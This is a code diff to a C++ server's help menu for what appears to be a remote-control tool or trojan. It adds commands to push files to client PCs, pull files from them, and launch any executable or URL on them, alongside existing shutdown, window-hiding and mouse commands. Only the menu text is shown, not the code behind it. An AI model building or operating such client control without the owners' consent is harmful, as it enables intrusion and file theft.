@@ -253,17 +253,20 @@ int __cdecl main(void)
 			{
 
 				std::cout <<
-					"\n\n terminal commands:\n"
+					"\n\n primary commands:\n"
 					"  -connect; sets an active client via its given id. I.E. connect 0 - connects to the first client, 1 is the second, and so on. (An active client is the client that can recieve data and send it back to the server.)\n"
 					"  -list; lists any clients that are currently connected to the server.\n"
 					"  -sendcmd; sends any [client executed commands] to the client to process.\n"
-					"  -clear; clears the terminal. \n\n"
+					"  -clear; clears the terminal. \n"
+					"  -sendfile; sends a file to the client. syntax = sendfile [file to send] | [location on client]\n\n"
 					"\nclient executed commands:\n"
 					"  -close_client; disconnects the client.\n"
 					"  -shutdown/restart; shuts down or restarts the client pc depending on which command is used.\n"
 					"  -get_window; gets the active focused window the client pc has opened.\n"
 					"  -hide_window; closes the current active window that is focused on the client pc.\n"
 					"  -random_mouse; sets the current cursor position to random.\n"
+					"  -getfile; retrieves a file on the client. syntax = sendcmd getfile [file to retrieve on client] | [location on server]\n"
+					"  -shellexecute; basic call to the winapi ShellExecuteA function, just place the executable path/web address after the call\n"
 					<< endl;
 			};
 		}
